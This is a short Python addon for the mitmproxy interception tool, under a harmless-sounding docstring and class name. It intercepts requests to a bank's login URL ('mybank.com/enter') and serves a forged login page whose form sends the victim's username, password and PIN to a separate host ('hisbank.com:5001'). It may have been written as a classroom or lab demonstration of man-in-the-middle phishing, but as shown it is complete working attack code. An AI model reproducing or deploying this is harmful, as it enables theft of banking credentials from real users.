"""Send a reply from the proxy without sending any data to the remote server."""
from mitmproxy import http

class Counter:
    def __init__(self):
        pass

    def request(self, flow):
        if flow.request.pretty_url.startswith("http://mybank.com/enter") or flow.request.pretty_url.startswith("https://mybank.com/enter"):
            flow.response = http.HTTPResponse.make(
                200,  # (optional) status code
                b"""
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <img src="http://cdn.com:5000/" />
    <form id="form_id" action="http://hisbank.com:5001/login" method="POST" >
        <table>
            <tr>
                <td>User Name:</td>
                <td><input name="username" id="username" type="text"></td>
            </tr>
            <tr>
                <td>Password:</td>
                <td><input name="password" id="password" type="password"></td>
            </tr>
            <tr>
                <td>Pin code:</td>
                <td><input name="pin" id="pin" type="password"></td>
            </tr>
            <tr>
                <td><input name="chkbox" id="chkbox" type="checkbox"></td>
                <td><label for="chkbox">remember me</label></td>
            </tr>
            <tr>
                <td><input type="submit" value="Submit"></td>
            </tr>

        </table>
    </form>
</body>
</html>
                """,  # (optional) content
                {"Content-Type": "text/html"}  # (optional) headers
            )


addons = [
    Counter()
]



